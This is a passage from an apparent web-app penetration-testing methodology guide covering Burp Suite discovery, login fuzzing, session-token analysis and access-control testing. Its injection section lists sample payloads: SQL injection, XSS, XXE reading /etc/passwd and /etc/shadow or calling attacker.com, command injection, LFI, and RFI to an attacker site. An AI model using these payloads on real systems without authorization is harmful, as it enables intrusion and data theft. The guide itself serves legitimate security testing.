&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;One thing I really like to do early on during the discovery process is to try different user agents on certain pages using the &lt;code class=&quot;highlighter-rouge&quot;&gt;User Agent Switcher&lt;/code&gt; extension for &lt;code class=&quot;highlighter-rouge&quot;&gt;Firefox&lt;/code&gt;. This extension does exactly what it sounds like and changes the &lt;code class=&quot;highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt; request header to the one you select in the extension. This is because some applications are written to respond differently to different &lt;code class=&quot;highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Referer&lt;/code&gt; headers.&lt;/p&gt;
&lt;p&gt;I’ll often use &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Intruder&lt;/code&gt; to fuzz the &lt;code class=&quot;highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Referer&lt;/code&gt; headers for some of these pages as well. Typically using a wordlist from the &lt;code class=&quot;highlighter-rouge&quot;&gt;FuzzDB&lt;/code&gt; project as well.&lt;/p&gt;
&lt;h3 id=&quot;automated-discovery&quot;&gt;Automated Discovery&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Burp Scanner&lt;/td&gt;
&lt;td&gt;Burp Suite tool used for automatically finding security vulnerabilities in web applications.&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;While you’ve been mapping the application and conducting the initial parts of discovery &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Passive Scanner&lt;/code&gt; has been running in the background analyzing the target for vulnerabilities. These scan results should be reviewed prior to kicking off a scan with &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Active Scanner&lt;/code&gt; with any particularly stand-out pages made note of so that you can investigate them further at a later time.&lt;/p&gt;
&lt;p&gt;Due to the &lt;strong&gt;very&lt;/strong&gt; long amount of time that it takes for &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Active Scanner&lt;/code&gt; to complete I usually prefer to run it in bursts, reviewing scan results in between and making note of the results.&lt;/p&gt;
&lt;div class=&quot;note warning&quot; readability=&quot;10&quot;&gt;
&lt;h5&gt;Automated Scanning is dangerous&lt;/h5&gt;
&lt;p&gt;Using Burp Scanner may result in unexpected effects in some applications. Until you are fully familiar with its functionality and settings, you should only use Burp Scanner against non-production systems.&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&quot;configuration&quot;&gt;Configuration&lt;/h3&gt;
&lt;h4 id=&quot;default-configurations&quot;&gt;Default Configurations&lt;/h4&gt;
&lt;p&gt;Testing for default configurations is a logical follow-up step after enumerating the different technologies in-use by the target during mapping. A lot of frameworks ship with vulnerable pre-configured applications in order to introduce developers to their offerings. However, a lot of these “sample applications” are vulnerable out of the box! Better still if they exist on the same web server as the target (usually due to developer negligence, and forgotten about) they can oftentimes expose it to attack.&lt;/p&gt;
&lt;h4 id=&quot;testing-for-misconfigurations&quot;&gt;Testing for Misconfigurations&lt;/h4&gt;
&lt;p&gt;Ideally you should be keeping an eye out for misconfigurations in the application at all stages of testing. But, some big things you want to look out for at this point are verbose error messages since they will oftentimes give away useful information about &lt;strong&gt;database structure&lt;/strong&gt; and the &lt;strong&gt;web server file system&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&quot;note important&quot; readability=&quot;8&quot;&gt;
&lt;h5&gt;Verbose Error Messages Are Almost Always a Finding&lt;/h5&gt;
&lt;p&gt;The knowledge that these error messages give to attackers can often help in exploiting successful injection or LFI (local file include) attacks.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Another thing to look out for is any sensitive form fields that do not explicitly disable autofill. A big one that I see quite a bit is password fields with a “show/hide” button. By default browsers do not save the values entered for &lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; tags with a &lt;code class=&quot;highlighter-rouge&quot;&gt;type=&quot;password&quot;&lt;/code&gt; attribute. However, when the “show” button is pressed it changes the &lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;type=&quot;text&quot;&lt;/code&gt; which the browser can put in it’s autofill cache. This is a risk if the application can ever be used in a shared computing environment.&lt;/p&gt;
&lt;h3 id=&quot;authentication&quot;&gt;Authentication&lt;/h3&gt;
&lt;p&gt;During the discovery process you should scrutinize any login forms that you come across. If these forms are not properly secured (e.g. 2-factor, captcha, retry attempt lockout, etc.) an attacker can often gain unauthorized access to user account/s. Depending on how these forms are written or what framework / CMS is being used the target application may reveal the existence of a user account even if a login attempt fails.&lt;/p&gt;
&lt;p&gt;If any of these are true in your test it should almost always be noted and reported as a finding. Further, if any of the login forms are not using encryption (or an outdated/broken version of SSL/TLS) that should be noted and reported as well.&lt;/p&gt;
&lt;h4 id=&quot;fuzzing-logins&quot;&gt;Fuzzing Logins&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;3.5&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;CeWL&lt;/td&gt;
&lt;td&gt;Wordlist generator that creates wordlists by spidering target web sites&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;Burp Intruder&lt;/td&gt;
&lt;td&gt;Burp suite tool used to automate customized attacks against web applications (e.g. brute forcing, injection, etc.)&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;After you’ve scrutinized the applications login form/s it’s usually a good time to do some fuzzing. &lt;code class=&quot;highlighter-rouge&quot;&gt;CeWL&lt;/code&gt; is a really great tool for building custom wordlists for just this purpose. You should review the help documentation first by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;-h&lt;/code&gt; switch.&lt;/p&gt;
&lt;p&gt;For reference the syntax you will use will always be something like&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;cewl [options] www.example.com
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Once you’ve crafted your custom wordlist it’s time to break out &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Intruder&lt;/code&gt; once again and do the actual fuzzing. Generally I do this using two-payload sets (one being a wordlist of usernames and the other my &lt;code class=&quot;highlighter-rouge&quot;&gt;CeWL&lt;/code&gt; generated list for the passwords). The attack type you should typically use in intruder for this type of fuzzing is &lt;code class=&quot;highlighter-rouge&quot;&gt;Cluster Bomb&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;session-management&quot;&gt;Session Management&lt;/h3&gt;
&lt;p&gt;Session-token / Cookie analysis is not a particularly glamorous part of any engagement but it’s an important one nonetheless. Typically you want to try and get an understanding of what the target application is using for session tracking and then test the session-tokens themselves using a tool like &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Sequencer&lt;/code&gt; in order to determine how random/predictable they are. Further, some applications (generally legacy apps) will store session contents on the client-side. Occasionally this data will contain encoded, serialized objects that could potentially hold sensitive information.&lt;/p&gt;
&lt;p&gt;This is also the time to check if the &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; header of the http responses from the web server contains &lt;code class=&quot;highlighter-rouge&quot;&gt;Secure&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpOnly&lt;/code&gt; flags. If not this should be noted and reported as a finding as there is never really a reason not to include these flags.&lt;/p&gt;
&lt;div class=&quot;note info&quot; readability=&quot;10&quot;&gt;
&lt;h5&gt;Ask Google&lt;/h5&gt;
&lt;p&gt;It only takes a minute to google search the particular session token that you have from the target. This could potentially lead to being able to predict session tokens, which opens the door to session hijacking attacks.&lt;/p&gt;
&lt;/div&gt;
&lt;h4 id=&quot;testing-session-tokens-with-burp&quot;&gt;Testing Session Tokens With Burp&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Burp Sequencer&lt;/td&gt;
&lt;td&gt;Burp Suite tool for analyzing randomness in a collection of data.&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Sequencer&lt;/code&gt; is an excellent tool that allows us to test session-tokens for randomness and predictability. While you are testing session-management you should use this tool to analyze the session token by &lt;strong&gt;clearing your cookies&lt;/strong&gt; and then authenticating into the target application. Send the HTTP response containing the &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; header to &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Sequencer&lt;/code&gt; and then have the sequencer analyze the token by starting a live capture. Typically it’s okay stop the live capture after ~10,000 requests as that is generally sufficient to determine randomness and predictability in the session-tokens.&lt;/p&gt;
&lt;p&gt;If session tokens are not sufficiently random it opens the door to session hijacking attacks, and should be noted.&lt;/p&gt;
&lt;h3 id=&quot;authorization&quot;&gt;Authorization&lt;/h3&gt;
&lt;p&gt;Authorization issues like &lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control&quot;&gt;missing function level access control&lt;/a&gt;, and &lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;insecure direct object reference&lt;/a&gt; are among the most prevalent findings that I come across a majority of the time. This is because a lot of developers do not take into account the idea that a low-privilege user, or even an unauthenticated user, would try to send requests to higher-privilege endpoint (broken access control)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;http://example.com/app/admin_getappInfo
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;or attempt to access data belonging to a different user (insecure direct objet reference)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;http://example.com/app/accountInfo?acct=notmyacct
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;testing-access-control&quot;&gt;Testing Access Control&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Compare Site Maps&lt;/td&gt;
&lt;td&gt;Burp Tool for testing authorization by comparing site maps&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;This is a technique that I like to use after I’ve acquired two different user accounts intended to have different access levels within the target application (usually a standard account and an admin account, but this also works for testing unauthenticated users as well).&lt;/p&gt;
&lt;p&gt;I will map the application using the higher-privilege account, logout of the application, login as the lower-privilege user, then use Burp’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Compare Site Maps&lt;/code&gt; tool in order to see what resources I can access as the lower-privilege user that should be limited to only the higher-privilege user.&lt;/p&gt;
&lt;p&gt;
&lt;h5&gt;Make sure your target is added to the default session-handing rule's scope!&lt;/h5&gt;
&lt;/p&gt;
&lt;h3 id=&quot;data-validation-testing&quot;&gt;Data Validation Testing&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Burp Repeater&lt;/td&gt;
&lt;td&gt;Simple tool for manually manipulating and reissuing individual HTTP requests&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Injection vulnerabilities exist in web applications because they accept arbitrary user input, and do not properly validate it on the server-side. As a tester you should make note of any areas of the application that accept arbitrary user input and try to inject into them.&lt;/p&gt;
&lt;p&gt;All applications are different so there is no one single blanket checklist you should follow when testing for injection flaws. However, I will try to break them down into sub-sections along with example injection payloads. Further, &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Repeater&lt;/code&gt; is typically what I use the most when testing for injection flaws. It is a relatively-simple tool that lets you repeat requests to the same endpoint while giving you the opportunity to change the payload each time.&lt;/p&gt;
&lt;p&gt;Something &lt;strong&gt;very&lt;/strong&gt; important to keep in mind: The purpose of discovery is to simply identify the flaws, whereas with exploitation we want to see how far they go. Obviously, the existence of any of these injection flaws is worthy of reporting, however try to save in-depth testing of each one after the discovery phase.&lt;/p&gt;
&lt;p&gt;Please refer to the &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; links in each sub-section for more information.&lt;/p&gt;
&lt;h4 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h4&gt;
&lt;p&gt;If any inputs are used in queries to a database they could possibly be vulnerable to SQL injection. Combined with misconfiguration issues such as &lt;strong&gt;verbose error messages&lt;/strong&gt; this can lead to significant amounts of data being compromised by an attacker.&lt;/p&gt;
&lt;p&gt;I recommend reading &lt;a href=&quot;https://sqlwiki.netspi.com/#mysql&quot;&gt;this wiki by Netspi&lt;/a&gt; when testing for SQL injection as it’s a great resource. At it’s simplest though, if you get a database error back from any of these payloads odds are that the target is vulnerable to SQL injection.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Sqlmap&lt;/code&gt; is a tool that allows for testing for sql injection in an automated way, and I will dig into its use further in the &lt;strong&gt;exploitation&lt;/strong&gt; section.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)&quot;&gt;OWASP - Testing for SQL Injection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;' OR 1=1 -- 1
' OR '1'='1
' or 1=1 LIMIT 1;-- 
admin';--

http://www.example.com/product.php?id=10 AND 1=1
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;cross-site-scripting-xss&quot;&gt;Cross-site Scripting (XSS)&lt;/h4&gt;
&lt;p&gt;Cross-site Scripting (XSS) attacks occur when an attacker uses a web application to send malicious code, generally in the form of JavaScript, to a different end user.&lt;/p&gt;
&lt;p&gt;There are 3 different types of XSS that you should keep an eye out for:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;Stored&lt;/strong&gt; - A Stored XSS vulnerability exists when data provided to a web application by a user is first stored persistently on the server.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reflected&lt;/strong&gt; - A Reflected XSS vulnerability exists when data provided by a web client is used immediately by server-side scripts to generate a page of results for that user.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DOM-Based&lt;/strong&gt; - A DOM-based XSS vulnerability exists within a page’s client-side script itself.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Cross_site_scripting&quot;&gt;OWASP - Testing for Cross-site Scripting&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&amp;lt;IMG SRC=javascript:alert('XSS')&amp;gt;
&quot;&amp;gt;&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;&amp;lt;&quot;
&quot; onmouseover=&quot;alert('XSS')

http://server/cgi-bin/testcgi.exe?&amp;lt;SCRIPT&amp;gt;alert(“Cookie”+document.cookie)&amp;lt;/SCRIPT&amp;gt;
%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;xml-injection&quot;&gt;XML Injection&lt;/h4&gt;
&lt;p&gt;XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)&quot;&gt;OWASP - Testing for XML Injection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;Username = foo&amp;lt;
Username = foo&amp;lt;!--
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h5 id=&quot;xml-external-entities-xxe&quot;&gt;XML External Entities (XXE)&lt;/h5&gt;
&lt;p&gt;If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt; &lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [  
   &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;&lt;/span&gt;]&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;foo&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/foo&amp;gt;&lt;/span&gt;

 &lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [  
   &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/shadow&quot; &amp;gt;&lt;/span&gt;]&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;foo&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/foo&amp;gt;&lt;/span&gt;

 &lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [  
   &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &amp;gt;&lt;/span&gt;]&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;foo&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/foo&amp;gt;&lt;/span&gt;

 &lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [  
   &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;http://www.attacker.com/text.txt&quot; &amp;gt;&lt;/span&gt;]&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;foo&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/foo&amp;gt;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;template-injection&quot;&gt;Template Injection&lt;/h4&gt;
&lt;p&gt;Template injection allows an attacker to include template code into an existant (or not) template.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.portswigger.net/2015/08/server-side-template-injection.html&quot;&gt;Portswigger - Server Side Template Injecton&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&amp;lt;%= 7 * 7 %&amp;gt;
{{ 7 * 7 }}
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;os-command-injection&quot;&gt;OS Command Injection&lt;/h4&gt;
&lt;p&gt;OS Command Injection is a technique where a user injects OS commands into web application interface with the intention of those commands executing on the web server.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)&quot;&gt;OWASP - Testing for Command Injection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
http://sensitive/something.php?dir=%3Bcat%20/etc/passwd

Doc=Doc1.pdf+|+Dir c:\
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;open-redirection&quot;&gt;Open Redirection&lt;/h4&gt;
&lt;p&gt;Open redirection is an input validation flaw that exists when an application accepts an user controlled input which specifies a link that leads to an external URL that could be malicious.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Client_Side_URL_Redirect_(OTG-CLIENT-004)&quot;&gt;OWASP - Testing for Client Side URL Redirect&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;http://www.target.site?#redirect=www.fake-target.site 
http://www.target.site??url=http://www.fake-target.site 
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;local-file-inclusion-lfi&quot;&gt;Local File Inclusion (LFI)&lt;/h4&gt;
&lt;p&gt;Local File Inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion&quot;&gt;OWASP - Testing for Local File Inclusion&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;http://vulnerable_host/preview.php?file=../../../../etc/passwd
http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;remote-file-inclusion-rfi&quot;&gt;Remote File Inclusion (RFI)&lt;/h4&gt;
&lt;p&gt;Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion&quot;&gt;OWASP - Testing for Remote File Inclusion&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;business-logic&quot;&gt;Business Logic&lt;/h3&gt;
&lt;p&gt;Discovering flaws in business logic requires you, as the attacker, to have a decent fundemental understanding of the target application. Once you know the way the application is intended to be used you can start to reason how it could be exploited. When testing for business logic flaws refer back to areas of the application where you as the user are expected to complete a series of actions in a certain order (e.g. password reset form, order form, etc.) and try executing those actions out of order.&lt;/p&gt;
&lt;p&gt;Further, you should check if a user is able to enter unrealistic values into certain inputs fields within the application (e.g. a fitness app where a user is expected to enter the amount of miles run)?&lt;/p&gt;
&lt;p&gt;This is also a good time to test for &lt;a href=&quot;https://www.owasp.org/index.php/Unrestricted_File_Upload&quot;&gt;unrestricted file upload&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&quot;encryption-flaws&quot;&gt;Encryption Flaws&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;SSLyze&lt;/td&gt;
&lt;td&gt;TLS/SSL Implementation Analyzer&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;When determining the quality of an applications SSL/TLS implementation I always recommend starting out with the &lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSL Labs’ Server Test&lt;/a&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;SSLyze&lt;/code&gt; if that can’t be done.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SSLyze Example&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;sslyze --regular www.example.com
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Generally, this boils down to:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Whether or not the application is using some form of encryption.&lt;/li&gt;
&lt;li&gt;Is that encryption protocol insecure or vulnerable (TLS 1.2, SSL2/SSl3)?&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;You should also use this time to investigate if the application is using weak encryption algorithms (e.g. MD5, RC4, etc.) and supports forward secrecy.&lt;/p&gt;
&lt;h3 id=&quot;denial-of-service&quot;&gt;Denial-of-Service&lt;/h3&gt;
&lt;p&gt;In a nutshell Denial-of-Service (DoS) is an attack wherein the prepetrator aims to make the target application unavilable to its users in one way or another. Denial-of-Service attack vectors can range from user file uploads (if they are not logically restricted by size) to a user account lockout mechanism in place to prevent brute force login attempts.&lt;/p&gt;
&lt;p&gt;If there are any pages that take a long time to load or ajax requests that take a long time to come back, these could be indicators of poorly written SQL queries that could be leveraged to perform a DoS attack.&lt;/p&gt;
&lt;h3 id=&quot;flash-applications&quot;&gt;Flash Applications&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;Firefox Developer Tools&lt;/td&gt;
